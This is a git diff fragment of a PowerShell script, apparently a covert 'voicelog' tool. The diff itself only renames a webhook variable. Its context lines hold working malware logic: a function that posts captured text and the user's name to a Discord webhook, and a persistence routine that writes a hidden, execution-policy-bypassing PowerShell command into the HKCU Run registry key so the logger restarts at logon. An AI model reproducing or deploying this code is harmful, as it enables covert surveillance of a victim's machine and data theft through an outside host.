@@ -5,18 +5,18 @@ function Send-Discord {
 		[string]$text 
 	);
 
-    # $hook = "";
+    # $Hook = "";
 
 	$Body = @{
 	  "username" = $env:username;
 	  "content" = $text
 	};
 
-	if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType "Application/Json" -Uri $hook  -Method Post -Body ($Body | ConvertTo-Json) };
+	if (-not ([string]::IsNullOrEmpty($text))){Invoke-RestMethod -ContentType "Application/Json" -Uri $Hook  -Method Post -Body ($Body | ConvertTo-Json) };
 }
 
 if(($Persistent -eq $true)){
-    $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$hook=' + $hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + ';Get-Item voicelog.ps1 | Invoke-Expression;sleep 5;exit'); 
+    $autostart = ('powershell -NoP -NonI -W Hidden -Exec Bypass -C cd $env:temp;sleep 1;$Hook=' + $Hook + ';$RunTime=' + $Runtime + ';$TimesRun=' + $TimesRun + ';Get-Item voicelog.ps1 | Invoke-Expression;sleep 5;exit'); 
     New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'voicelog' -Value $autostart;
 }else{
     Remove-Item "$env:temp\voicelog.ps1" -Force;
